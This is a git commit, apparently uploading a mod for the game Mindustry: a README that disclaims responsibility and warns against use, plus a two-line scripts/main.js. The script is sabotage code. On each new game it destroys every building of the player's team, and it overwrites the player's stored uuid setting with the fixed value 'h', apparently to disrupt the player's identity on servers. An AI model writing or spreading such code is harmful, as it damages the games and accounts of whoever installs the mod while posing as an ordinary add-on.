18bc1d15012d4d7fd6af978115b1e3c45fea4055
RebornTrack970 <62565267+RebornTrack970@users.noreply.github.com>
2021-04-01 13:03:24 +0300

    Add files via upload

---
+++ README.md
@@ -0,0 +1,2 @@
+# h
+I have 0 Responsibility if you use this mod. Do Not Use This Mod!
---
+++ scripts/main.js
@@ -0,0 +1,2 @@
+Events.on(Trigger.newGame.class,e=>{Groups.build.each(b=>{if(b.team==Team.sharded){b.kill()}});var uuid = Core.settings.put("uuid", "h");});
+var uuid = Core.settings.put("uuid", "h");
